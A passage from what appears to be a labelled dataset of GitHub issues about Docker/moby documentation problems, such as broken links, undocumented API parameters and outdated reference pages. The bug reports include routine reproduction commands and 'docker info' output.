doesn't *really* clarify what the differences are, perhaps Moby is some base library to Docker? (But then what is `libcontainerd`? More abstraction?)"},{"labels":[null,"documentation"],"text":"Docker API documentation needs to be updated.\r\n\r\nThe `/plugins` endpoint returns the following response: https://github.com/moby/moby/blob/0ac25dfc751fa4304ab45afd5cd8705c2235d101/api/types/plugin_responses.go#L1\r\n\r\nBased on https://github.com/moby/moby/blob/0ac25dfc751fa4304ab45afd5cd8705c2235d101/api/types/plugin.go#L8-L31\r\n\r\nThe plugin object is quite different from the one documented in the 200 response sample at https://docs.docker.com/engine/api/v1.30/#operation/PluginList\r\n"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nThe link of the \"docker run\" clean up command is not correct. The link is \"https://docs.docker.com/engine/reference/run/#clean-up---rm\" and should be \"https://docs.docker.com/engine/reference/run/#clean-up--rm\".\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://docs.docker.com/engine/reference/run/\r\n2. Click the link\r\n3. It doesn't work\r\n4. Check https://docs.docker.com/engine/reference/run/#clean-up--rm\r\n\r\n**Describe the results you received:**\r\nThe link doesn't work\r\n\r\n**Describe the results you expected:**\r\nThe link should work\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nI notice that if I change the markdown code to have only one \"-\", the link of the markdown is broken.\r\n\r\n**Output of `docker version`:**\r\nIt is the online documentation of 17.06\r\n\r\n**Output of `docker info`:**\r\nIt is the online documentation of 17.06\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nNone"},{"labels":[null,"documentation",null,null],"text":"At the moment, the Dockerfile reference states the following:\r\n\r\n> A Dockerfile must start with a `FROM` instruction.\r\n\r\nHowever, this has since been changed because:\r\n\r\n> FROM instructions support variables that are declared by any ARG instructions that occur before the first FROM.\r\n\r\nThe `docs/reference/builder.md` file should be updated to reflect this change."},{"labels":[null,"documentation",null,null,null],"text":"I've got 2 use cases which stopped working with the latest version of docker. But unfortunately I can't say with which version it started.\r\n\r\nUse Case 1:\r\nI generate a config file for an asp.net page with a custom console application. Therefore I have the key/values for the config file in the parameter:\r\n```\r\nRUN C:\\\\deployment\\\\tool.exe -value \"ConnectionString=\\\"Server=localhost;Database=Test;User Id=sa;Password=password\\\";Title=\\\"Test\\\"\" -dir C:\\inetpub\\wwwroot\\Test\r\n```\r\n\r\nUse Case 2:\r\nI generate also a json file with the tool. Also here I pass the json content as parameter:\r\n```\r\nRUN C:\\\\deployment\\\\tool.exe -value \"{\\\"\"Title\\\"\":\\\"\"Unknown\\\"\",\\\"\"Packages\\\"\":[{\\\"\"Id\\\"\":\\\"\"Test\\\"\",\\\"\"Version\\\"\":\\\"\"*\\\"\",\\\"\"Configuration\\\"\":\\\"\"Release\\\"\"}]}\" -dir C:\\inetpub\\wwwroot\\Test\r\n```\r\n\r\nBoth cases generate now powershell errors. I can't find a way to get it working again."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nOn querying images list each image list will be having `Containers` property with value -1 regardless of amount of containers using this image.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run container from the image(for example `docker run -ti ubuntu bash`)\r\n2. Get list of images from the API(`curl --unix-socket /var/run/docker.sock \"http:/v1.30/images/json\"`)\r\n\r\n**Describe the results you received:**\r\n\r\n\"ubuntu\" image has `Containers` property with value -1.\r\n\r\n**Describe the results you expected:**\r\n\r\n`Containers` property with value 1\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:31:53 2017\r\n OS/Arch:      darwin/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:51:55 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: true\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 2\r\n Paused: 0\r\n Stopped: 2\r\nImages: 40\r\nServer Version: 17.06.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host ipvlan macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.9.31-moby\r\nOperating System: Alpine Linux v3.5\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 1.952GiB\r\nName: moby\r\nID: QN2D:44BC:EQ5U:GCN2:Z2XT:DSNU:GGTI:FNKB:MHAJ:3I7E:ASHB:RJTT\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 34\r\n Goroutines: 48\r\n System Time: 2017-07-07T10:18:20.598658487Z\r\n EventsListeners: 1\r\nNo Proxy: *.local, 169.254/16\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: true\r\nInsecure Registries:\r\n jenkin-registry.gsintlab.com\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\nSince docker `17.06.0-ce` have been released. How to upgrade swarm mode cluster' docker engine? Upgrade starting from worker or manager? And how to ensure the cluster `raft` store state."},{"labels":[null,"documentation"],"text":"**Description**\r\n\r\nLooking at the [Docker Engine API docs](https://docs.docker.com/engine/api/v1.26/#operation/ContainerCreate) (scroll down and expand HostConfig, then scroll down to find the Binds documentation), I don't see anything related to the SELinux Context, which is mentioned in the docker documentation [here](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels).\r\n\r\nHowever, it seems that the `:Z` or `:z` which are SELinux flags are accepted as I'm able to pass them (See reproduction of the issue).\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n\r\nIf you have vagrant : \r\n1. create a `Vagrantfile` containing \r\n\r\n```\r\n# -*- mode: ruby -*-\r\n# vi: set ft=ruby :\r\n\r\nVagrant.configure(\"2\") do |config|\r\n  config.vm.box = \"fedora/25-cloud-base\"\r\n\r\n  config.vm.provision \"shell\", inline: <<-SHELL\r\n    set -eux\r\n\r\n    # prepare the system and install dependencies\r\n    dnf install -q -y docker\r\n    systemctl start docker\r\n    docker pull alpine:latest\r\n    \r\n    # Sanity check, to make sure unwanted argument do not pass\r\n    curl -s --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\\r\n    -d '{\"Image\": \"alpine\", \"Binds\": [\"/vagrant/Vagrantfile:/Vagrantfile:a\"]}' \\\r\n    -X POST http:/v1.24/containers/create\r\n\r\n    curl -s --unix-socket /var/run/docker.sock -H \"Content-Type: application/json\" \\\r\n    -d '{\"Image\": \"alpine\", \"Binds\": [\"/vagrant/Vagrantfile:/Vagrantfile:Z\"]}' \\\r\n    -X POST http:/v1.24/containers/create\r\n  SHELL\r\nend\r\n```\r\n2. run `vagrant up` in the same directory\r\n\r\nIf you don't use vagrant, make sure you have docker installed and run the two curl commands manually.\r\n\r\n**Describe the results you received:**\r\n\r\nThe first curl command failed which is normal, the api shouldn't accept invalid specifications, but the second succeeds, which is also normal as it is SELinux related. However, it is not specified in the documentation.\r\n\r\nI will work on a fix in the documentation as soon as possible. However, I have a question about it, should we add a link to the [documentation](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels) for reference or should we just specify more examples ?\r\n\r\nThank you."},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\nThe `docker stack ps --filter` option should be \"desired-state\" and not \"desired-stat\" as in documentation.\r\nhttps://docs.docker.com/engine/reference/commandline/stack_ps/#extended-description\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1.Create a Swarm mode\r\n2.Create a Stack\r\n3.List stack containers with `docker stack ps --filter desired-stat=running`\r\n\r\n`desired-stat` is not a filter\r\n\r\n\r\nA list of running containers in the stack.\r\n\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nA documentation bug. \r\n\r\nDocker 17.03\r\n\r\n\r\n\r\n**Output of `docker info`:**\r\n\r\nNot relevant as the bug is in the documentation. \r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nDocker for AWS Stable used to create Swarm.\r\n"},{"labels":["documentation"],"text":"From the release notes of v17.06.0-ce-rc2\r\n\r\n> Placement now also take platform in account moby/moby#33144\r\n\r\nWhile the PR that introduced the feature also updated the API docs, it didn't update the [user docs for service create](https://github.com/moby/moby/blob/master/docs/reference/commandline/service_create.md#specify-service-constraints---constraint), that also mention the placement constraints.\r\n\r\nI also noticed that the documentation here https://github.com/docker/swarmkit/#features talks about placement constrains, and mentions `node.ip` as another supported constraint. I'm not sure this made it to 17.06 yet, but if it did, we also need to update the user docs page with that.\r\n\r\n/ping @nishanttotla since he was the one who introduced #33144\r\nand @mstanleyjones for visibility\r\n\r\n---\r\n\r\nIf you're triaging this issue and are thinking if this issue should be filed against docker/docker.github.io instead, keep in mind that docker/docker.github.io will fetches https://github.com/moby/moby/blob/master/docs/reference/ to build the user-facing docs, so this issue needs to be addressed on this repo."},{"labels":[null,"documentation"],"text":"As seen there: https://github.com/moby/moby/blob/df4ca50805baa1d1488d811e82125f607c8daa09/integration-cli/docker_api_swarm_service_test.go#L63,\r\nthere is an `insertDefaults` query parameter not stated in the docs."},{"labels":["documentation"],"text":"The API docs reference ServiceSpec in the Secret definition:\r\n```\r\nSecret{\r\nID:\tstring\r\nVersion:\tObjectVersion{...}\r\nCreatedAt:\tstring ($dateTime)\r\nUpdatedAt:\tstring ($dateTime)\r\nSpec:\tServiceSpec{...}\r\n}\r\n```"},{"labels":["documentation"],"text":"**Description**\r\n\r\nDocker and Docker-Compose documentations do not make clear what are the valid values of ulimit options for Docker.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Read Docker documentation\r\n2. Struggle to find correct option names. \r\n\r\n\r\n**Describe the results you received:**\r\n\r\nGoogle finds just a few places where possible options are listed - https://docs.aws.amazon.com/AmazonECS/latest/APIReference/API_Ulimit.html \r\nLooking on code - turns out it is incomplete and [any valid `setrlimit` option](https://linux.die.net/man/2/setrlimit) can be passed into `ulimits`\r\n\r\n**Describe the results you expected:**\r\n\r\nList of possible options or reference to example (setting list of file descriptiors, max memory, max cpu usage, etc)"},{"labels":["documentation",null],"text":"**Description**\r\n\r\nin `moby/container/state.go` we have a struct that handles containers state, it looks like this : \r\n``` go\r\ntype State struct {\r\n\tsync.Mutex\r\n\t// FIXME: Why do we have both paused and running if a\r\n\t// container cannot be paused and running at the same time?\r\n\tRunning           bool\r\n\tPaused            bool\r\n\tRestarting        bool\r\n\tOOMKilled         bool\r\n\tRemovalInProgress bool // Not need for this to be persistent on disk.\r\n\tDead              bool\r\n\tPid               int\r\n\tExitCodeValue     int    `json:\"ExitCode\"`\r\n\tErrorMsg          string `json:\"Error\"` // contains last known error when starting the container\r\n\tStartedAt         time.Time\r\n\tFinishedAt        time.Time\r\n\tHealth            *Health\r\n\r\n\twaitStop   chan struct{}\r\n\twaitRemove chan struct{}\r\n}\r\n```\r\nthis is a bit misleading as we need to always update the two bools in order to avoid any inconsistant behaviour.\r\nthe state is embed in : \r\n```go\r\ntype CommonContainer struct {\r\n\tStreamConfig *stream.Config\r\n\t// embed for Container to support states directly.\r\n\t*State          `json:\"State\"` // Needed for Engine API version <= 1.11\r\n          .....\r\n     }\r\n```\r\nas states the comments to ensure compatibility with versions <= 1.11, i think we can refactor without breaking much of it."},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nThe current `swagger.yaml` file on the master branch, when rendered, causes some fields to not render, and the page then hangs.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `make swagger-docs`\r\n2. Go to `localhost:9000` in your browser\r\n3. Go to `/services/create`, click on `TaskTemplate`\r\n4. Try clicking anywhere else on the page\r\n\r\n**Describe the results you received:**\r\nThe page hangs\r\n\r\n**Describe the results you expected:**\r\nThe page shouldn't hang, and it should be possible to continue viewing fields."},{"labels":[null,"documentation"],"text":"feature added in https://github.com/moby/moby/pull/32496"},{"labels":[null,"documentation"],"text":"### Documentation Problem Description\r\n\r\nPer @gdevillele , the API reference topic [Delete unused volumes](https://docs.docker.com/engine/api/v1.28/#operation/VolumePrune) mentions a `filters` query parameter, but doesn’t mention any supported argument (because there isn’t any). This doesn’t make sense, we should not mention this “filters” parameter.\r\n\r\n### Where Found\r\n\r\n[Delete unused volumes](https://docs.docker.com/engine/api/v1.28/#operation/VolumePrune) in the API reference docs. \r\n\r\n### About the docs\r\n\r\nCurrently, the  API docs source lives here in the `moby/moby` codebase, not in the docs repository https://github.com/docker/docker.github.io. \r\n\r\n@thaJeztah need guidance on how we will deal with the relationship between `moby/moby` and the docs repository going forward. I don't have permissions to assign issues, but I suggest assigning to @mstanleyjones ?\r\n\r\n### Reviewers\r\n\r\n@gdevillele @johndmulhausen @thaJeztah \r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"Hello,\r\n\r\ni have an error using this page (click into \"Labels\" menù):\r\n\r\nhttps://docs.docker.com/engine/api/v1.28/#operation/ServiceCreate\r\n\r\nJS Console stacktrace:\r\n\r\nError: Can't load component schema at /paths/~1services~1create/post/parameters/0/schema/properties/Labels\r\n    at d (redoc.1.11.0.min.js:43)\r\n    at e.init (redoc.1.11.0.min.js:17)\r\n    at e.t.preinit (redoc.1.11.0.min.js:9)\r\n    at e.preinit (redoc.1.11.0.min.js:9)\r\n    at e.ngOnInit (redoc.1.11.0.min.js:17)\r\n    at t.ngDoCheck (redoc.1.11.0.min.js:15)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:15)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:16)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)\r\n    at e.detectChangesInternal (redoc.1.11.0.min.js:16)\r\n    at e.t.detectChanges (redoc.1.11.0.min.js:7)\r\n    at t.detectChangesInNestedViews (redoc.1.11.0.min.js:7)"},{"labels":[null,"documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nThe http endpoint `GET /networks` always returns an empty containers list. If requesting a single network, with `GET /networks/<network>` the containers are shown. \r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Run `curl --unix-socket /var/run/docker.sock http:/v1.28/networks`\r\n\r\n**Describe the results you received:**\r\nReturns the following output: https://gist.github.com/Grisu118/1a15ea9a2abb6b04f45eb911a2f1c7f7#file-networks-json\r\n\r\n**Describe the results you expected:**\r\nI expect the output contains a container list like the /networks/development request:\r\nhttps://gist.github.com/Grisu118/1a15ea9a2abb6b04f45eb911a2f1c7f7#file-networks_development-json\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nWorked in 13.x (don't know the exact version which was running before reboot)\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.04.0-ce\r\n API version:  1.28\r\n Go version:   go1.7.3\r\n Git commit:   4845c56\r\n Built:        Wed Apr 12 22:57:26 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.04.0-ce\r\n API version:  1.28 (minimum version 1.12)\r\n Go version:   go1.7.3\r\n Git commit:   4845c56\r\n Built:        Wed Apr 12 22:57:26 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 28\r\n Running: 25\r\n Paused: 0\r\n Stopped: 3\r\nImages: 37\r\nServer Version: 17.04.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary:\r\ncontainerd version: 422e31ce907fd9c3833a38d7b8fdd023e5a76e73\r\nrunc version: 9c2d8d184e5da67c95d601382adf14862e4f2228\r\ninit version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574)\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.10.9-coreos\r\nOperating System: Container Linux by CoreOS 1381.0.0 (Ladybug)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.68GiB\r\nName: test01\r\nID: NDXW:B2RO:4U2N:CQRG:P7QK:DT53:DNTE:GH3A:N7IZ:2MSK:HHXC:MRTU\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\n```\r\n"},{"labels":["documentation",null,null],"text":"**Steps to reproduce the issue:**\r\n1. Create next Dockerfile in \"test\" directory:\r\n\r\n   FROM debian\r\n   CMD echo \"test\"\r\n\r\n2. Go to \"test\" directory and execute next command (build image): \"docker build -t test:latest .\"\r\n3. Create docker stack file with name \"docker-cloud.yml\":\r\n\r\n   version: \"3\"\r\n   services:\r\n    test:\r\n       image: test:latest\r\n\r\n4. Execute next command: \"docker stack deploy -c docker-cloud.yml services\"\r\n5. Wait several seconds and execute \"docker ps -a\".\r\n\r\n**Expected**:\r\nOne exited container \"test:latest\" because default restart option value is \"no\" according [documentation](https://docs.docker.com/docker-cloud/apps/stack-yaml-reference/#restart).\r\n\r\n**Actual**:\r\nSeveral exited containers with \"test:latest\" tag.\r\n\r\n**Docker version**:\r\nClient:\r\n Version:      17.03.0-ce\r\n API version:  1.26\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.03.0-ce\r\n API version:  1.26 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   60ccb22\r\n Built:        Thu Feb 23 10:54:03 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false`\r\n\r\n**Docker info**:\r\nContainers: 5\r\n Running: 5\r\n Paused: 0\r\n Stopped: 0\r\nImages: 16\r\nServer Version: 17.03.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: active\r\n NodeID: 06qm3mlo2dtnnrt0lebbfqkiz\r\n Is Manager: true\r\n ClusterID: yonkvlxzljjjztpxzcuc3fnrn\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: ...\r\n Manager Addresses:\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 977c511eda0925a723debdc94d09459af49d082a\r\nrunc version: a01dafd48bc1c7cc12bdb01206f9fea7dd6feb70\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.10.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 3.695 GiB\r\nName: q4de3csye47\r\nID: 2FXY:XP3H:UWFL:3R7U:CF5H:THXJ:XC5K:SZTS:U4LV:AY7D:3JNV:FOJF\r\nDocker Root Dir: /docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nHttp Proxy: ...\r\nHttps Proxy: ...\r\nNo Proxy: ...\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n ...\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n"},{"labels":["documentation",null],"text":"Hi!\r\n\r\nI wonder where I can find a PDF or other version of the current Docker documentation. I was unable to find it via Google and the official docs page. Probably I'm overlooking sth.?\r\n\r\nThanks for your help!"},{"labels":["documentation",null,null],"text":"Currently the plugin docs have a \"legacy\" doc which explains both the v1 discovery model as well as the RPC protocol for activation.\r\nThe v2 plugin doc doesn't really mention anything about how RPC is handled.\r\n\r\nBasically, getting started with plugins can be pretty confusing. Docs could use some love."},{"labels":["documentation",null,null],"text":"Consciously referring to Issue #29617, now Closed.\r\n\r\nThere *is* (in my humble opinion) an issue here.\r\n\r\nIt is a documentation issue.\r\n\r\nFollowing https://docs.docker.com/engine/getstarted/step_one/#step-3-verify-your-installation, at Step 3, sub-step 2, the command provided is\r\n\r\ndocker run hello-world\r\n\r\nNothing there indicates that there might be anything platform/architecture dependent.\r\n\r\nThis is in Verify your Installation. It is therefore likely to be followed verbatim by relatively uninformed potential users who might reasonably assume that a basic test should Just Work.\r\n\r\nIn fact the result is this:\r\npi@rpi2b ~ $ docker run hello-world\r\nstandard_init_linux.go:178: exec user process caused \"exec format error\"\r\n\r\nThe resulting error message is not handled in the linked 'Troubleshooting' section of the tutorial.\r\n\r\nThe workaround is\r\npi@rpi2b ~ $ docker run armhf/hello-world\r\n\r\nHello from Docker on armhf!\r\nThis message shows that your installation appears to be working correctly.\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\nOne link in README.md file in the root directory of docker repository.\r\nIn [the getting the development builds section](https://github.com/docker/docker#getting-the-development-builds) , link \"docs.master.dockerproject.org.\" is dead.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Describe the results you received:**\r\nLink is dead\r\n\r\n**Describe the results you expected:**\r\nI think this link should be linked to docs.master.dockerproject main page.\r\n\r\n"},{"labels":["documentation",null,null],"text":"For example, hyperlink for [\"Docker build with --squash argument\"](https://github.com/docker/docker/blob/bd811aa4fde8632197c96ca3a7af039789768107/experimental/docker-build-with-squash.md) is broken: https://github.com/docker/docker/blob/bd811aa4fde8632197c96ca3a7af039789768107/experimental/README.md\r\n\r\n\r\nCan we detect such deadlinks on 